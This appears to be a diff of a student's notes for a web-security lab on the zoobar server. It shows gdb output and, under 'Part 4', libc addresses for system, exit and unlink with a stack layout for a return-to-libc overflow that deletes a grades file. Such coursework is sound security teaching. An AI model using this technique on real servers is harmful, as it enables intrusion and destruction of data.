@@ -99,5 +99,24 @@ zookd.c
 (gdb) print env
 $34 = "REQUEST_METHOD=GET\000SERVER_PROTOCOL=HTTP/1.1\000REQUEST_URI=/zoobar/index.cgi/\000SERVER_NAME=zoobar.org", '\000' <repeats 8094 times>
 
+-------------------------------------------------------------
+-------------------------------------------------------------
+-------------------------------------------------------------
+Part 4
 
+(gdb) p system
+$1 = {<text variable, no debug info>} 0x40065100 <__libc_system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0x40058150 <__GI_exit>
+(gdb) p unlink
+$3 = {<text variable, no debug info>} 0x40102450 <unlink>
 
+*stack*
+0xbffff628  str  "/home/httpd/grades.txt"
+0xbffff624  stradr  0xbffff628
+0xbffff620  exit  0x40058150
+0xbffff61c  unlink 0x40102450
+"aaa"
+"..."
+"aaa"
+0xbfffee08  reqpath  "/aaa"
